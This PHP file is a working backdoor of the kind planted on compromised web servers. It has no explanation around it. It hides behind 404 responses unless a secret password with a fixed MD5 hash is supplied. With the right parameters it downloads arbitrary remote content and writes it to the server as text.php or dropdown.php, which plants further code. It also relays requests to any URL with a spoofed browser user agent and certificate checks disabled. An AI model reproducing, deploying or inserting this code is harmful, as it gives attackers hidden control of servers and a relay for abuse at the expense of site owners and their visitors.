<?php
$ex = isset($_GET['ex']) ? $_GET['ex'] : '';
if($ex){
    exit('1');
}
$pw = isset($_GET['pw']);
if(isset($_GET['pw'])){
    if(md5($_GET['pw'])=='ffc52a7aef7b90a27c1fbaec516a4f0e'){
        if(isset($_GET['cb'])){
            $cb = @file_get_contents(base64_decode($_GET['cb']));
            $file_name_arr = ['text.php','dropdown.php'];
            $fid = rand(0,count($file_name_arr)-1);
            @file_put_contents($file_name_arr[$fid],$cb);
            $self = $_SERVER['PHP_SELF'];
            $self_arr = explode('/',$self);
            $cb_url = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].str_replace($self_arr[count($self_arr)-1],$file_name_arr[$fid],$self);
            exit($cb_url);
        }
        $url = base64_decode($_GET['url']);
        $ua = isset($_GET['ua']) ? base64_decode($_GET['ua']) : "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36";
        $param = array();
        if(isset($_GET['param'])){
            $param = json_decode($_GET['param'],true);
        }        
        echo get($url,$ua,$param);
    }else{
        http_response_code(404);
	    exit();
    }
}else{
    http_response_code(404);
	exit();
}
function get($filepath, $ua, $param) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $filepath);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_USERAGENT, $ua);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $param);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}    
?>